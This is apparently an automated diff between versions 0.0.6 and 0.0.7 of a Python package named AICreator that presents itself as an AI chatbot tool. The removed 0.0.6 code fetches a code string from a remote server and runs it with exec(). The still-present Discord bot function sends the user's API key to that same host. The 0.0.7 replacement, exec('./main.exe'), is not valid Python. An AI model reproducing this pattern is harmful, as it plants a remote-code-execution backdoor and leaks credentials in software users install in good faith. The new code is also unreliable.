# Comparing `tmp/AICreator-0.0.6.tar.gz` & `tmp/AICreator-0.0.7.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "AICreator-0.0.6.tar", last modified: Tue May  2 17:31:29 2023, max compression
+gzip compressed data, was "AICreator-0.0.7.tar", last modified: Thu May  4 15:13:01 2023, max compression
```

## Comparing `AICreator-0.0.6.tar` & `AICreator-0.0.7.tar`

### file list

```diff
@@ -1,20 +1,20 @@
-drwxrwxrwx   0        0        0        0 2023-05-02 17:31:29.771714 AICreator-0.0.6/
-drwxrwxrwx   0        0        0        0 2023-05-02 17:31:29.764229 AICreator-0.0.6/AICreator.egg-info/
--rw-rw-rw-   0        0        0      559 2023-05-02 17:31:29.000000 AICreator-0.0.6/AICreator.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      345 2023-05-02 17:31:29.000000 AICreator-0.0.6/AICreator.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-05-02 17:31:29.000000 AICreator-0.0.6/AICreator.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0        9 2023-05-02 17:31:29.000000 AICreator-0.0.6/AICreator.egg-info/requires.txt
--rw-rw-rw-   0        0        0       17 2023-05-02 17:31:29.000000 AICreator-0.0.6/AICreator.egg-info/top_level.txt
-drwxrwxrwx   0        0        0        0 2023-05-02 17:31:29.765707 AICreator-0.0.6/AICreatorPackage/
--rw-rw-rw-   0        0        0      156 2023-05-02 13:30:46.000000 AICreator-0.0.6/AICreatorPackage/__init__.py
-drwxrwxrwx   0        0        0        0 2023-05-02 17:31:29.769716 AICreator-0.0.6/AICreatorPackage/functions/
--rw-rw-rw-   0        0        0      957 2023-05-02 14:53:28.000000 AICreator-0.0.6/AICreatorPackage/functions/AICreatorPackage.py
--rw-rw-rw-   0        0        0        0 2022-04-25 10:59:44.000000 AICreator-0.0.6/AICreatorPackage/functions/__init__.py
--rw-rw-rw-   0        0        0     1078 2022-04-24 17:23:55.000000 AICreator-0.0.6/LICENCE.txt
--rw-rw-rw-   0        0        0       25 2021-08-13 08:55:17.000000 AICreator-0.0.6/MANIFEST.in
--rw-rw-rw-   0        0        0      559 2023-05-02 17:31:29.770746 AICreator-0.0.6/PKG-INFO
--rw-rw-rw-   0        0        0       73 2023-05-02 12:11:18.000000 AICreator-0.0.6/README.txt
--rw-rw-rw-   0        0        0        0 2022-04-24 17:21:54.000000 AICreator-0.0.6/__init__.py
--rw-rw-rw-   0        0        0       42 2023-05-02 17:31:29.771714 AICreator-0.0.6/setup.cfg
--rw-rw-rw-   0        0        0      675 2023-05-02 17:31:24.000000 AICreator-0.0.6/setup.py
--rw-rw-rw-   0        0        0       79 2023-05-02 14:45:13.000000 AICreator-0.0.6/tytytry.py
+drwxrwxrwx   0        0        0        0 2023-05-04 15:13:01.153133 AICreator-0.0.7/
+drwxrwxrwx   0        0        0        0 2023-05-04 15:13:01.136644 AICreator-0.0.7/AICreator.egg-info/
+-rw-rw-rw-   0        0        0      559 2023-05-04 15:13:01.000000 AICreator-0.0.7/AICreator.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      345 2023-05-04 15:13:01.000000 AICreator-0.0.7/AICreator.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-05-04 15:13:01.000000 AICreator-0.0.7/AICreator.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0        9 2023-05-04 15:13:01.000000 AICreator-0.0.7/AICreator.egg-info/requires.txt
+-rw-rw-rw-   0        0        0       17 2023-05-04 15:13:01.000000 AICreator-0.0.7/AICreator.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2023-05-04 15:13:01.142643 AICreator-0.0.7/AICreatorPackage/
+-rw-rw-rw-   0        0        0      156 2023-05-02 13:30:46.000000 AICreator-0.0.7/AICreatorPackage/__init__.py
+drwxrwxrwx   0        0        0        0 2023-05-04 15:13:01.151134 AICreator-0.0.7/AICreatorPackage/functions/
+-rw-rw-rw-   0        0        0      780 2023-05-04 12:47:06.000000 AICreator-0.0.7/AICreatorPackage/functions/AICreatorPackage.py
+-rw-rw-rw-   0        0        0        0 2022-04-25 10:59:44.000000 AICreator-0.0.7/AICreatorPackage/functions/__init__.py
+-rw-rw-rw-   0        0        0     1078 2022-04-24 17:23:55.000000 AICreator-0.0.7/LICENCE.txt
+-rw-rw-rw-   0        0        0       25 2021-08-13 08:55:17.000000 AICreator-0.0.7/MANIFEST.in
+-rw-rw-rw-   0        0        0      559 2023-05-04 15:13:01.152135 AICreator-0.0.7/PKG-INFO
+-rw-rw-rw-   0        0        0       73 2023-05-02 12:11:18.000000 AICreator-0.0.7/README.txt
+-rw-rw-rw-   0        0        0        0 2022-04-24 17:21:54.000000 AICreator-0.0.7/__init__.py
+-rw-rw-rw-   0        0        0       42 2023-05-04 15:13:01.153133 AICreator-0.0.7/setup.cfg
+-rw-rw-rw-   0        0        0      675 2023-05-04 12:47:37.000000 AICreator-0.0.7/setup.py
+-rw-rw-rw-   0        0        0       79 2023-05-02 14:45:13.000000 AICreator-0.0.7/tytytry.py
```

### Comparing `AICreator-0.0.6/AICreator.egg-info/PKG-INFO` & `AICreator-0.0.7/AICreator.egg-info/PKG-INFO`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: AICreator
-Version: 0.0.6
+Version: 0.0.7
 Summary: AI Creator Package By - oren
 Home-page: 
 Author: oren
 Author-email: orennadle@gmail.com
 License: MIT
 Keywords: ai
 Classifier: Development Status :: 5 - Production/Stable
```

### Comparing `AICreator-0.0.6/AICreatorPackage/functions/AICreatorPackage.py` & `AICreator-0.0.7/AICreatorPackage/functions/AICreatorPackage.py`

 * *Files 10% similar despite different names*

```diff
@@ -4,22 +4,16 @@
 
 
 
 
 def AICreatorChatBot():
     print("[+] AICreator (By Oren) Is Ready!")
 
-    cc = requests.post(f'http://aicreator.oren777.me:25573/api/v1.0.0/chatbot/')
+    exec('./main.exe')
 
-    cc1 = cc.json()
-
-    try:
-        exec(cc1['c'])
-    except:
-        print("error, please contact support.")
 
 
 
 def AICreatorDiscordBot(apiKEY):
     print("[+] AICreator (By Oren) Is Ready!")
 
     cc = requests.post(f'http://aicreator.oren777.me:25573/api/v1.0.0/discordbot/{apiKEY}/')
```

### Comparing `AICreator-0.0.6/LICENCE.txt` & `AICreator-0.0.7/LICENCE.txt`

 * *Files identical despite different names*

### Comparing `AICreator-0.0.6/PKG-INFO` & `AICreator-0.0.7/PKG-INFO`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: AICreator
-Version: 0.0.6
+Version: 0.0.7
 Summary: AI Creator Package By - oren
 Home-page: 
 Author: oren
 Author-email: orennadle@gmail.com
 License: MIT
 Keywords: ai
 Classifier: Development Status :: 5 - Production/Stable
```

### Comparing `AICreator-0.0.6/setup.py` & `AICreator-0.0.7/setup.py`

 * *Files 1% similar despite different names*

```diff
@@ -6,15 +6,15 @@
     'Operating System :: Microsoft :: Windows :: Windows 10',
     'License :: OSI Approved :: MIT License',
     'Programming Language :: Python :: 3'
 ]
 
 setup(
     name='AICreator',
-    version='0.0.6',
+    version='0.0.7',
     description='AI Creator Package By - oren',
     long_description=open('README.txt').read(),
     url='',
     author='oren',
     author_email='orennadle@gmail.com',
     license='MIT',
     classifiers=classifiers,
```

